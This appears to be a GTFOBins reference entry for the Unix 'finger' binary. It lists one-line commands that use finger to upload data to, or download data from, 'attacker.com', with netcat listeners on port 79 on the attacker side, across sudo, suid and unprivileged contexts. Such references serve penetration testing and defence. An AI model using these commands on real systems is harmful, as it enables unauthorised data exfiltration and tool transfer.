<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/finger -->
---
functions:
  download:
  - code: |-
      finger x@attacker.com
    comment: |-
      The command hangs waiting for the remote peer to close the socket.
    contexts:
      sudo:
      suid:
      unprivileged:
    sender:
      code: |-
        nc -l -p 79 </path/to/input-file
      comment: |-
        A TCP server can be used on the attacker box to send the data.
  upload:
  - code: |-
      finger DATA@attacker.com
    comment: |-
      The command hangs waiting for the remote peer to close the socket.
    contexts:
      sudo:
      suid:
      unprivileged:
    receiver:
      code: |-
        nc -l -p 79 >/path/to/output-file
      comment: |-
        A TCP server can be used on the attacker box to receive the data.
...
